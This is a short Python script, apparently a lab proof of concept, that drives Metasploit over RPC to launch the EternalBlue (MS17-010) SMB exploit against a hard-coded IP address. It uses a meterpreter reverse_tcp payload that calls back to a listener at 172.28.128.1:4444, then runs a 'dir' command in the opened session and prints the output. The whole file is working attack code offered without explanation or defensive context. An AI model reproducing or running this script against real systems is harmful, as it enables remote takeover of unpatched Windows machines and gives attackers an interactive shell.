import subprocess
import smbclient
import re
from pymetasploit3.msfrpc import MsfRpcClient
def ms17010_poc(ip):
        client = MsfRpcClient('1qaz@WSX',ssl=False)
        exploit = client.modules.use('exploit','windows/smb/ms17_010_eternalblue')
        exploit['RHOSTS']  = str(ip)
        payload = client.modules.use('payload', 'windows/meterpreter/reverse_tcp')
        payload['LHOST'] = '172.28.128.1'
        payload['LPORT'] = '4444'
        # exploit['CHOST'] = "10.4.16.77"
        #re.sub("\\n","",subprocess.check_output(["hostname -I | awk '{print $1}'"],shell=True).decode("utf-8"))
        # exploit['CPORT'] = "4444"
        # print(exploit.targetpayloads())
        result =exploit.execute(payload="windows/x64/meterpreter/reverse_tcp")
        # print(result)
        if bool(client.sessions.list):
            session_number = list(client.sessions.list.keys())[0]
            print(session_number)
            shell = client.sessions.session(session_number)
            shell.write('dir')
            result = shell.read()
            final_result = "\n".join(result.splitlines()[4:10])
            
            print(final_result)
            return final_result
        else:
            print("null")
            return "NULL"
ms17010_poc("10.10.232.18")